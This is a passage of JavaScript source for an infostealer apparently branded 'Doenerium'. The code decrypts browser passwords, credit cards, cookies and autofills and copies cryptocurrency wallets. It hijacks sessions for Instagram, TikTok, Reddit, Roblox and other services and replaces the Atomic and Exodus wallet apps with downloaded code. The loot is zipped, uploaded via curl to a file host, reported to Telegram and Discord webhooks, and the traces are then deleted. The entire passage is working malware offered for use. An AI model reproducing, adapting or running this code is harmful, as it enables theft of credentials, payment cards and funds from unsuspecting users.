                const walletFolder = path.join(walletsFolder, walletName);
                copyFolder(walletFolder, walletPath);
            }
        }
        const data = {
            Discord: [path.join(mainFolderPath, 'Discord', 'discord.txt')],
        };
        if (tokens.length > 0) {
            const discordFolderPath = path.join(mainFolderPath, 'Discord');
            if (!fs.existsSync(discordFolderPath)) {
                fs.mkdirSync(discordFolderPath);
            }
            const discordFilePath = path.join(discordFolderPath, 'discord.txt');
            const discordFileContent = tokens.join('\n');
            fs.writeFileSync(discordFilePath, discordFileContent);
            console.log('Tokens saved to discord.txt');
        } else {
            const discordFolderPath = path.join(mainFolderPath, 'Discord');
            if (!fs.existsSync(discordFolderPath)) {
                fs.mkdirSync(discordFolderPath);
            }
            const discordFilePath = path.join(discordFolderPath, 'discord.txt');
            const noTokenMessage = 'No token found.';
            fs.writeFileSync(discordFilePath, noTokenMessage);
            console.log('No token found. Updated discord.txt with message.');
        }
        Object.entries(data).forEach(([dataType, files]) => {
            files.forEach(file => moveFileToFolder(file, dataType));
            console.log(`Files moved to ${dataType} folder`);
        });

        const powershellCommand = `powershell -ExecutionPolicy Bypass -File "${scriptPath}"`;
        const powershellProcess = exec(powershellCommand);
        powershellProcess.stdout.on('data', (data) => {
            console.log(`PowerShell script output:\n${data}`);
        });
        powershellProcess.stderr.on('data', (data) => {
            console.error(`PowerShell script error:\n${data}`);
        });
        powershellProcess.on('exit', (code) => {
            if (code === 0) {
                console.log('PowerShell script executed successfully.');
            } else {
                console.error(`PowerShell script exited with code ${code}.`);
            }
        });
        const archive = new AdmZip();
        archive.addLocalFolder(mainFolderPath);
        zipFilePath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}.zip`;
        archive.addZipComment('All the Information was Stealed by T.ME/DOENERIUM69.');
        archive.writeZip(zipFilePath);
        console.log('Archive created successfully');
        getExtension(zipFilePath);
    } catch (error) {
        console.error(`Error in archiveAndSendData: ${error.message}`);
    } finally {
        try {
            if (fs.existsSync(mainFolderPath)) {
                console.log(`Deleted folder and its content: ${mainFolderPath}`);
            }
        } catch (error) {
            console.error(`Error during cleanup: ${error.message}`);
        }
    }
}


async function uploadToDoge(destinationFolder, locale, computerName) {
    return new Promise((resolve, reject) => {
        const zipFilePath = `${destinationFolder}/${locale}-${computerName}.zip`;

        if (!fs.existsSync(zipFilePath)) {
            console.error(`Error: File does not exist - ${zipFilePath}`);
            reject(new Error(`File does not exist - ${zipFilePath}`));
            return;
        }

        const uploadCommand = `curl --location --request POST "https://api.filedoge.com/upload" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}";`

        exec(uploadCommand, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error uploading to FileDoge: ${error}`);
                reject(error);
            } else {
                try {
                    const response = JSON.parse(stdout);
                    const token = response.token;
                    console.log(`Upload successful. Token: ${token}`);
                    resolve(token);
                } catch (jsonError) {
                    console.error(`Error parsing JSON response: ${jsonError}`);
                    reject(new Error('Invalid JSON response from the API'));
                }
            }
        });
    });
}


function runSerialChecker() {
    const filePath = path.join(mainFolderPath, 'Serial-Check.txt');

    const commandMappings = {
        'wmic diskdrive get serialnumber': 'Disk',
        'wmic baseboard get serialnumber': 'Motherboard',
        'wmic path win32_computersystemproduct get uuid': 'SMBios',
        'wmic PATH Win32_VideoController GET Description,PNPDeviceID': 'GPU',
        'wmic memorychip get serialnumber': 'RAM',
        'wmic csproduct get uuid': 'Bios',
        'wmic cpu get processorid': 'CPU',
        'getmac /NH': 'Mac'
    };

    const outputFileStream = fs.createWriteStream(filePath);

    function runNextCommand(index) {
        const commandKeys = Object.keys(commandMappings);

        if (index < commandKeys.length) {
            const command = commandKeys[index];
            const header = `======= ${commandMappings[command]} =======\n`;

            outputFileStream.write(header);

            exec(command, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Error executing command: ${command}\n${error}`);
                    outputFileStream.write(`Error executing command: ${command}\n${error}\n`);
                } else {
                    console.log(`Command executed successfully: ${command}`);
                    const cleanedOutput = stdout.replace(/ +/g, ' ').replace(/\n+/g, ' ');
                    outputFileStream.write(cleanedOutput);
                }

                runNextCommand(index + 1);
            });
        } else {
            console.log(`Serial Checker completed. Output saved to: ${filePath}`);
            outputFileStream.end();
        }
    }

    outputFileStream.write(user.copyright);
    runNextCommand(0);
}

async function getExtension(zipFilePath) {

    const discordTokensFilePath = path.join(mainFolderPath, 'discord', 'discord.txt');
    let discordTokensCount = 0;

    if (fs.existsSync(discordTokensFilePath)) {
        const discordTokensContent = fs.readFileSync(discordTokensFilePath, 'utf-8');
        const discordTokensEntries = discordTokensContent.split('\n').filter(entry => entry.trim() !== '');

        if (discordTokensEntries.length > 0) {
            discordTokensCount = discordTokensEntries.length;
        }
    }

    const cookiesFolder = path.join(mainFolderPath, 'cookies');

    const passwordsFilePath = path.join(mainFolderPath, 'Passwords', 'passwords.txt');
    let passwordsCount = 0;

    if (fs.existsSync(passwordsFilePath)) {
        const passwordsContent = fs.readFileSync(passwordsFilePath, 'utf-8');
        const passwordsEntries = passwordsContent.split('Username').filter(entry => entry.trim() !== '');
        passwordsCount = passwordsEntries.length;
    }

    // Count autofills
    const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
    let autofillCount = 0;

    if (fs.existsSync(autofillsFolderPath)) {
        const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');

        if (fs.existsSync(autofillsFilePath)) {
            const autofillsContent = fs.readFileSync(autofillsFilePath, 'utf-8');
            const autofillEntries = autofillsContent.split('\n').filter(entry => entry.trim() !== '');
            autofillCount = autofillEntries.length;
        }
    }
    const walletsFolderPath = path.join(mainFolderPath, 'Wallets');
    const walletSubdirectories = fs.readdirSync(walletsFolderPath).filter(item => fs.statSync(path.join(walletsFolderPath, item)).isDirectory());
    let walletCount = walletSubdirectories.length;
    const foundFoldersText = await checkFolders(mainFolderPath);
    const foundWalletsText = await checkWallets(mainFolderPath);
    const foundFoldersTele = await checkFolderstele(mainFolderPath);
    const foundWalletsTele = await checkWalletstele(mainFolderPath);

    const destinationFolder = 'C:\\ProgramData\\Steam\\Launcher';
    const token = await uploadToDoge(destinationFolder, locale, computerName);
    const downloadLink = `https://api.filedoge.com/download/${token}`;
    const ip = await getIp();

const message = `
🔐 <b>Passwords:</b> <code>${passwordsCount}</code>
🍪 <b>Cookies:</b> <code>${count.cookies}</code>
📋 <b>Autofills:</b> <code>${autofillCount}</code>
💸 <b>Wallets:</b> <code>${walletCount}</code>
🔑 <b>Tokens:</b> <code>${discordTokensCount}</code>

<b>⚙ <i><u>System Information:</u></i></b>
<b>
Hostname: <code>${user.hostname}</code>
User Info: <code>${user.userInfo}</code>
Version: <code>${user.version}</code>
IP Address: <code>${ip}</code>
Uptime: <code>${user.uptime}</code>
Type: <code>${user.type}</code>
Arch: <code>${user.arch}</code>
Release: <code>${user.release}</code>
Count Core: <code>${user.countCore}</code>
File Location: <code>${user.fileLoc}</code>
</b>

<b><i>Download Link:</i></b> <a href="${downloadLink}"><b><u>${locale}-${computerName}.zip</u></b></a>

<b><u><i>Local Session Found:</i></u></b>
${foundFoldersTele || 'None'}

<b><u><i>Local Wallets Found:</i></u></b>
${foundWalletsTele || 'None'}
`;

const screenshotPath = path.join(mainFolderPath, 'Screenshots', 'Screenshot.png');

    if (fs.existsSync(screenshotPath)) {
        const imageBuffer = fs.readFileSync(screenshotPath);
        
        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
const formData = new FormData();
formData.append('chat_id', chatId);
formData.append('photo', imageBuffer, { filename: 'Screenshot.png' });
formData.append('caption', message);

try {
    await axios.post(telegramApiUrl, formData, {
        headers: {
            'Content-Type': `multipart/form-data; boundary=${formData._boundary}`,
        },
        params: {
            parse_mode: 'HTML',
        },
    });

    console.log('Screenshot and system information successfully sent to Telegram.');
} catch (error) {
    console.error('Telegram Error:', error);
    console.error('Error response data:', error.response.data);
}
    } else {
        const telegramMessageApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        try {
            await axios.post(telegramMessageApiUrl, {
                chat_id: chatId,
                parse_mode: 'HTML',
                text: message,
            });

            console.log('System information successfully sent to Telegram (without screenshot).');
        } catch (error) {
            console.error(`Error sending system information to Telegram: ${error.message}`);
        }
    }



    const combinedInfoEmbed = {
        title: '',
        description: '‎',
        color: 0x303037,
        author: {
            name: `${user.hostname} | System Information | @WallGod69`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
        fields: [
            {
                name: '🔐 Passwords',
                value: '```' + passwordsCount.toString() + '```',
                inline: true,
            },
            {
                name: '<:cookie:1205123589930749995> Cookies',
                value: '```' + count.cookies.toString() + '```',
                inline: true,
            },
            {
                name: '📋 Autofills',
                value: '```' + autofillCount.toString() + '```',
                inline: true,
            },
            {
                name: '<a:2891bitcoin:984181779038617623> Browser extension/wallet',
                value: '```' + walletCount.toString() + '```',
                inline: true,
            },
            {
                name: '🔑 Tokens',
                value: '```' + discordTokensCount.toString() + '```',
                inline: true,
            },
            {
                name: '‎',
                value: '**<a:system:1205123587632275517> System Information**\n```\n' +
                    `Hostname: ${user.hostname}\n` +
                    `User Info: ${user.userInfo}\n` +
                    `Version: ${user.version}\n` +
                    `IP Address: ${ip}\n` +
                    `Uptime: ${user.uptime}\n` +
                    `Type: ${user.type}\n` +
                    `Arch: ${user.arch}\n` +
                    `Release: ${user.release}\n` +
                    `Count Core: ${user.countCore}\n` +
                    `File Location: ${user.fileLoc}\n` +
                    '```',
                inline: false,
            },
            {
                name: '‎ ',
                value: `<:download:917499025282973766> [\`${locale}-${computerName}.zip\`](${downloadLink})\n\n**___Local Session Found:___**\n` + foundFoldersText || 'None',
                inline: false,
            },
            {
            name: '**___Local Wallets Found:___**',
            value: foundWalletsText || 'None',
            inline: false,
            },
        ],
        footer: {
            text: `${user.hostname} | @WallGod69 | t.me/doenerium69`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
    };

axios.post(discordWebhookUr1, { embeds: [combinedInfoEmbed] })
    .then(() => { 
        console.log('system information successfully sent to Discord webhook.');
    })
    .catch(error => {
        console.error('An error occurred while sending system information:', error.message);
    });
    await new Promise(resolve => setTimeout(resolve, 1000));
    axios.post(discordWebhookUrl, { embeds: [combinedInfoEmbed] })
        .then(() => {
            console.log('system information successfully sent to Discord webhook.');
        })
        .catch(error => {
            console.error('An error occurred while sending system information:', error.message);
        });
        
    await clean();
    await new Promise(resolve => setTimeout(resolve, 5000));
    process.exit();
}

async function clean() { 
    const steamLauncherPath = 'C:/ProgramData/Steam/Launcher';
    if (fs.existsSync(steamLauncherPath)) {
        execSync(`rmdir /s /q "${steamLauncherPath}"`);
        console.log(`Folder ${steamLauncherPath} deleted successfully.`);
    } else {
        console.log(`Folder ${steamLauncherPath} does not exist.`);
    }

    const captureScriptPath = path.join(user.temp, 'CaptureScreens.ps1');
    if (fs.existsSync(captureScriptPath)) {
        fs.unlinkSync(captureScriptPath);
        console.log(`File ${captureScriptPath} deleted successfully.`);
    } else {
        console.log(`File ${captureScriptPath} does not exist.`);
    }
}

function deleteFolderRecursive(folderPath) {
    if (fs.existsSync(folderPath)) {
        fs.readdirSync(folderPath).forEach((file, index) => {
            const curPath = path.join(folderPath, file);
            if (fs.lstatSync(curPath).isDirectory()) {
                deleteFolderRecursive(curPath);
            } else {
                fs.unlinkSync(curPath);
            }
        });
        fs.rmdirSync(folderPath);
    }
}

async function checkFolders(mainFolderPath) {
    const foldersToCheck = [
        { name: 'Telegram', emoji: '<:Telegram_2019_Logo:1210423641062510652>' },
        { name: 'Steam', emoji: '<:Steam_icon_logo47:1210423638356922489>' },
        { name: 'RiotGames', emoji: '<:Riot_Games_2019_Symbol:1210423639883644938>' },
        { name: 'FileZilla', emoji: '<:filezilla_macos_bigsur_icon_1901:1210423500716777522>' },
        { name: 'Epic Games', emoji: '<:Icon6:1205137412666163211>' },
    ];

    const separator = ' | ';
    let foundFoldersText = '';

    try {
        for (const { name, emoji } of foldersToCheck) {
            const folderPath = path.join(mainFolderPath, name);

            if (fs.existsSync(folderPath) || fs.existsSync(path.join(mainFolderPath, name.toLowerCase()))) {
                foundFoldersText += `${emoji} **${name}**${separator}`;
            }
        }

        foundFoldersText = foundFoldersText.slice(0, -separator.length);

        return foundFoldersText || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}



async function checkWallets(mainFolderPath) {
    const walletEmojis = {
        "Bitcoin": '<a:2891bitcoin:984181779038617623>',
        "Zcash": '<a:outputonlinegiftools1:1212238144229867530>',
        "Armory": '<:imageremovebgpreview2:1212238560715870270>',
        "Bytecoin": '<:bytecoinbcnbcnlogo:1212317682016329738>',
        "Jaxx": '<:imageremovebgpreview4:1212239745942552606>',
        "Exodus": '<:imageremovebgpreview5:1212249434922950686>',
        "Ethereum": '<:imageremovebgpreview__7_removebg:1212248769291358209>',
        "Electrum": '<:imageremovebgpreview6:1212249431718625321>',
        "AtomicWallet": '<:atomic_wallet_logo_dark_rounded1:1212250322274230362>',
        "Guarda": '<a:outputonlinegiftools2:1212249427021012993>',
        "Coinomi": '<:co950cccacoinomilogocoinomiwalle:1212250113485836378>',
    };

    const separator = ' | ';
    let foundWalletsText = '';

    try {
        // Check if the wallet folder exists inside the main folder
        const walletFolder = path.join(mainFolderPath, 'Wallets');
        if (fs.existsSync(walletFolder)) {
            // Check all walletLocalPaths and display them with emojis
            const walletEntries = await fs.promises.readdir(walletFolder);
            let metamaskFound = false;

            const foundWallets = walletEntries.map(walletName => {
                const walletEmoji = walletEmojis[walletName];

                if (walletName.toLowerCase().startsWith('metamask')) {
                    if (!metamaskFound) {
                        metamaskFound = true;
                        return `<a:imageedit_1_5973982742:1212322722609233961> **Metamask**${separator}`;
                    }
                } else {
                    return walletEmoji ? `${walletEmoji} **${walletName}**${separator}` : null;
                }
            }).filter(wallet => wallet !== null);

            foundWalletsText = foundWallets.join('');
            if (foundWalletsText) {
                foundWalletsText = foundWalletsText.slice(0, -separator.length);
            }
        }

        return foundWalletsText || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}

async function checkFolderstele(mainFolderPath) {
    // Function similar to checkFolders without emojis for Telegram
    const foldersToCheck = [
        { name: 'Telegram' },
        { name: 'Steam' },
        { name: 'RiotGames' },
        { name: 'FileZilla' },
        { name: 'Epic Games' },
    ];

    const separator = '<b> | </b>';
    let foundFoldersTele = '';

    try {
        for (const { name } of foldersToCheck) {
            const folderPath = path.join(mainFolderPath, name);

            if (fs.existsSync(folderPath) || fs.existsSync(path.join(mainFolderPath, name.toLowerCase()))) {
                foundFoldersTele += `<code>${name}</code>${separator}`;
            }
        }

        foundFoldersTele = foundFoldersTele.slice(0, -separator.length);

        return foundFoldersTele || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}

async function checkWalletstele(mainFolderPath) {
    // Function similar to checkWallets without emojis for Telegram
    const separator = '<b> | </b>';
    let foundWalletsTele = '';

    try {
        // Check if the wallet folder exists inside the main folder
        const walletFolder = path.join(mainFolderPath, 'Wallets');
        if (fs.existsSync(walletFolder)) {
            // Check all walletLocalPaths and display them without emojis
            const walletEntries = await fs.promises.readdir(walletFolder);
            let metamaskFound = false;

            const foundWallets = walletEntries.map(walletName => {
                if (walletName.toLowerCase().startsWith('metamask')) {
                    if (!metamaskFound) {
                        metamaskFound = true;
                        return `<code>Metamask</code>${separator}`;
                    }
                } else {
                    return `<code>${walletName}</code>${separator}`;
                }
            });

            foundWalletsTele = foundWallets.join('');
            if (foundWalletsTele) {
                foundWalletsTele = foundWalletsTele.slice(0, -separator.length);
            }
        }

        return foundWalletsTele || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}


function localWalletData() {
    try {
        const walletsDestination = path.join(mainFolderPath, 'Wallets');
        if (!fs.existsSync(walletsDestination)) {
            fs.mkdirSync(walletsDestination, { recursive: true });
        }

        // Copy data for each wallet
        for (const walletName in walletLocalPaths) {
            const walletSource = walletLocalPaths[walletName];
            const walletDestination = path.join(walletsDestination, walletName);

            if (fs.existsSync(walletSource)) {
                if (!fs.existsSync(walletDestination)) {
                    fs.mkdirSync(walletDestination, { recursive: true });
                }

                // Copy the contents of the wallet folder to the Wallets subfolder
                copyFolder(walletSource, walletDestination);
            }
        }

        console.log('Wallet data copied successfully.');
    } catch (error) {
        console.error(`Error copying wallet data: ${error.message}`);
    }
}


async function walletinjection() {
    await injectAtomic();
    await injectExodus();
}

async function injectAtomic() {
    const atomicPath = path.join(process.env.LOCALAPPDATA, 'Programs', 'atomic');
    const atomicAsarPath = path.join(atomicPath, 'resources', 'app.asar');
    const atomicLicensePath = path.join(atomicPath, 'LICENSE.electron.txt');

    await inject(atomicPath, atomicAsarPath, atomicInjectionUrl, atomicLicensePath);
}

async function injectExodus() {
    const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
    const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));

    for (const exodusDir of exodusDirs) {
        const exodusPathWithVersion = path.join(exodusPath, exodusDir);
        const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
        const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');

        await inject(exodusPath, exodusAsarPath, exodusInjectionUrl, exodusLicensePath);
    }
}

async function inject(appPath, asarPath, injectionUrl, licensePath) {
    if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) {
        return;
    }

    try {
        const response = await axios.get(injectionUrl, { responseType: 'stream' });

        if (response.status !== 200) {
            return;
        }

        const writer = fs.createWriteStream(asarPath);
        response.data.pipe(writer);

        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        if (licensePath) {
            fs.writeFileSync(licensePath, discordWebhookUrl);
        }
    } catch (error) {
        console.error('Error during injection:', error);
    }
}



async function getPasswords() {
  const _0x540754 = [];

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const _0x256bed = browserPath[_0x261d97][0] + 'Login Data';
    const _0x239644 = browserPath[_0x261d97][0] + 'passwords.db';

    fs.copyFileSync(_0x256bed, _0x239644);

    const _0x3d71cb = new sqlite3.Database(_0x239644);

    await new Promise((_0x2c148b, _0x32e8f4) => {
      _0x3d71cb.each(
        'SELECT origin_url, username_value, password_value, date_created FROM logins',
        (_0x4c7a5b, _0x504e35) => {
          if (!_0x504e35.username_value) {
            return;
          }

          try {
            let _0x3d2b4b = _0x504e35.password_value;
            const _0x5e1041 = _0x3d2b4b.slice(3, 15);
            const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
            const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16, _0x3d2b4b.length);
            const _0x210aeb = crypto.createDecipheriv(
              'aes-256-gcm',
              Buffer.from(browserPath[_0x261d97][3], 'hex'),
              _0x5e1041
            );
            _0x210aeb.setAuthTag(_0x2a933a);
            const password =
              _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') +
              _0x210aeb.final('utf-8');
            
            const dateCreated = new Date(_0x504e35.date_created / 1000 - 11644473600 * 1000).toLocaleString();

            _0x540754.push(
              '================\nURL: ' +
                _0x504e35.origin_url +
                '\nUsername: ' +
                _0x504e35.username_value +
                '\nPassword: ' +
                password +
                '\nDate Created: ' +
                dateCreated +
                '\nApplication: ' +
                _0xd541c2 +
                ' ' +
                browserPath[_0x261d97][1] +
                '\n'
            );
          } catch (_0x5bf37a) {}
        },
        () => {
          _0x2c148b('');
        }
      );
    });
  }

  if (_0x540754.length === 0) {
    _0x540754.push('no password found for ');
  }

  if (_0x540754.length) {
    const passwordsFolderPath = path.join(mainFolderPath, 'Passwords');
    if (!fs.existsSync(passwordsFolderPath)) {
      fs.mkdirSync(passwordsFolderPath);
    }

    const passwordsFilePath = path.join(passwordsFolderPath, 'Passwords.txt');
    fs.writeFileSync(passwordsFilePath, user.copyright + _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}


async function getCards() {
  const _0x540754 = [];

  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) {
      continue;
    }

    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const webData = browserPath[_0x261d97][0] + 'Web Data';
    const copiedFilePath = browserPath[_0x261d97][0] + 'Web.db';

    const key = Buffer.from(browserPath[_0x261d97][3], 'hex');

    fs.copyFileSync(webData, copiedFilePath);

    const databaseConnection = new sqlite3.Database(copiedFilePath);

    await new Promise((resolve, reject) => {
      databaseConnection.each(
        'SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards',
        (err, card) => {
          if (err) {
            reject(err);
          } else {
            try {
              const month = card.expiration_month < 10 ? `0${card.expiration_month}` : `${card.expiration_month}`;
              const _0x5e1041 = card.card_number_encrypted ? card.card_number_encrypted.slice(3, 15) : '';
              const decryptedCardNumber = subModules.decryption(card.card_number_encrypted, key);
              const cardInfo = `${decryptedCardNumber}\t${month}/${card.expiration_year}\t${card.name_on_card}\n`;
              _0x540754.push(cardInfo);
            } catch (error) {}
          }
        },
        () => {
          resolve();
        }
      );
    });

    try {
      databaseConnection.close();
      fs.unlinkSync(copiedFilePath);
    } catch (error) {}
  }

  if (_0x540754.length === 0) {
    _0x540754.push('no cards found');
  }

  if (_0x540754.length) {
    const cardsFolderPath = path.join(mainFolderPath, 'Cards');
    if (!fs.existsSync(cardsFolderPath)) {
      fs.mkdirSync(cardsFolderPath);
    }

    const cardsFilePath = path.join(cardsFolderPath, 'Cards.txt');
    fs.writeFileSync(cardsFilePath, user.copyright + _0x540754.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}

async function getCookies() {
    const cookiesData = {};
    cookiesData['banner'] = [`${user.copyright}\n`];
    const matchedKeywords = [];

    for (let i = 0; i < browserPath.length; i++) {
        const networkPath = path.join(browserPath[i][0], 'Network');

        if (!fs.existsSync(path.join(networkPath, 'Cookies'))) {
            continue;
        }

        let browserFolder;
        if (browserPath[i][0].includes('Local')) {
            browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
        } else {
            browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
        }

        const cookiesPath = path.join(networkPath, 'Cookies');
        const db = new sqlite3.Database(cookiesPath);

        await new Promise((resolve) => {
            db.each(
                'SELECT * FROM cookies',
                function (err, row) {
                    if (err) {
                        console.error(`Error reading cookies from ${cookiesPath}:`, err);
                        return;
                    }

                    let encryptedValue = row.encrypted_value;
                    let iv = encryptedValue.slice(3, 15);
                    let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                    let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                    let decrypted = '';

                    try {
                        const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
                        decipher.setAuthTag(authTag);
                        decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

                        // Handle different services
                        if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
                            SubmitInstagram(`${decrypted}`);
                        } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
                            stealTikTokSession(`${decrypted}`);
                        } else if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
                            setRedditSession(`${decrypted}`);
                        } else if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
                            SpotifySession(`${decrypted}`);
                        } else if (row.name === '.ROBLOSECURITY') {
                            SubmitRoblox(`${decrypted}`);
                        } else if (row.host_key === 'account.riotgames.com' && row.name === 'sid') {
                            RiotGameSession(`${decrypted}`);
                        }

                        // Search for keywords
                        for (const keyword of keywords) {
                            if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) {
                                matchedKeywords.push(keyword);
                            }
                        }
                    } catch (error) {
                        console.error(`Error decrypting cookies for ${row.host_key}:`, error);
                    }

                    if (!cookiesData[`${browserFolder}_${browserPath[i][1]}`]) {
                        cookiesData[`${browserFolder}_${browserPath[i][1]}`] = [];
                    }

                    cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(
                        `${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n\n`
                    );

                    count.cookies++;
                },
                () => {
                    resolve('');
                }
            );
        });
    }

    // Send matched keywords to Discord webhook
    if (matchedKeywords.length > 0) {
        sendKeywordsToDiscord(matchedKeywords);
    }

    for (let [browserName, cookies] of Object.entries(cookiesData)) {
        if (browserName.toLowerCase() === 'banner') {
            continue;
        }

        if (cookies.length !== 0) {
            const cookiesContent = cookies.join('');

            // Add the banner content to the beginning of each cookies file
            const cookiesWithBanner = `${user.copyright}\n${cookiesContent}`;
            const fileName = `${browserName}.txt`;

            // Specify the folder path for Cookies
            const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
            const cookiesFilePath = path.join(cookiesFolderPath, fileName);

            try {
                if (!fs.existsSync(cookiesFolderPath)) {
                    fs.mkdirSync(cookiesFolderPath);
                }

                // Write the individual cookies file to the Cookies folder
                fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });

                // Move the cookies file to the main folder
                moveFileToFolder(cookiesFilePath, 'Cookies');
            } catch (error) {
                console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
            }
        }
    }
}

async function sendKeywordsToDiscord(keywords) {
    try {
        // Format keywords as clickable links separated by commas
        const formattedKeywords = keywords.map(keyword => `[**${keyword}**](https://${encodeURIComponent(keyword)})`).join(', ');

        // Embed style
        const embed_data = {
            "title": "Doenerium Keywords",
            "description": formattedKeywords,
            "color": 0x303037,
            "footer": {
                "text": `${user.hostname} | @WallGod69 | t.me/doenerium69`,
                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            }
        };

        const payload = {
            "embeds": [embed_data]
        };

        const headers = {
            "Content-Type": "application/json"
        };

        const responsePost = await axios.post(discordWebhookUrl, payload, { headers });
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}




async function getAutofills() {
  const autofillData = [];

  for (const pathData of browserPath) {
    const browserPathExists = fs.existsSync(pathData[0]);

    if (!browserPathExists) {
      continue;
    }

    const applicationName = pathData[0].includes('Local')
      ? pathData[0].split('\\Local\\')[1].split('\\')[0]
      : pathData[0].split('\\Roaming\\')[1].split('\\')[1];

    const webDataPath = pathData[0] + 'Web Data';
    const webDataDBPath = pathData[0] + 'webdata.db';

    fs.copyFileSync(webDataPath, webDataDBPath);

    const db = new sqlite3.Database(webDataDBPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT * FROM autofill',
        function (error, row) {
          if (row) {
            autofillData.push(
              '================\nName: ' +
                row.name +
                '\nValue: ' +
                row.value +
                '\nApplication: ' +
                applicationName +
                ' ' +
                pathData[1] +
                '\n'
            );
          }
        },
        function () {
          resolve('');
        }
      );
    });

    if (autofillData.length === 0) {
      autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
    }
  }

  if (autofillData.length) {
    const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
    const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');

    if (!fs.existsSync(autofillsFolderPath)) {
      fs.mkdirSync(autofillsFolderPath);
    }

    fs.writeFileSync(autofillsFilePath, user.copyright + autofillData.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
}
   

function copyriot(source, target, excludeList = []) {
    const targetFolder = path.join(target, path.basename(source));

    if (!fs.existsSync(targetFolder)) {
        fs.mkdirSync(targetFolder, { recursive: true });
    }

    if (fs.lstatSync(source).isDirectory()) {
        const files = fs.readdirSync(source);
        files.forEach((file) => {
            const curSource = path.join(source, file);
            const curTarget = path.join(targetFolder, file);

            if (!excludeList.some(excludedFile => curSource.includes(excludedFile))) {
                if (fs.lstatSync(curSource).isDirectory()) {
                    copyriot(curSource, targetFolder, excludeList);
                } else {
                    fs.copyFileSync(curSource, curTarget);
                }
            }
        });
    }
}



async function SubmitRiotGames() {
    try {
        var exists = false;

        if (fs.existsSync("C:\\ProgramData\\Riot Games")) {
            exists = true;
            exec("taskkill /IM \"RiotClientServices.exe\" /F", (error, stdout, stderr) => {});
            await new Promise(resolve => setTimeout(resolve, 2500));
        } else {
            exists = false;
        }

        if (exists) {
            const riotGamesSourcePath = "C:\\ProgramData\\Riot Games";
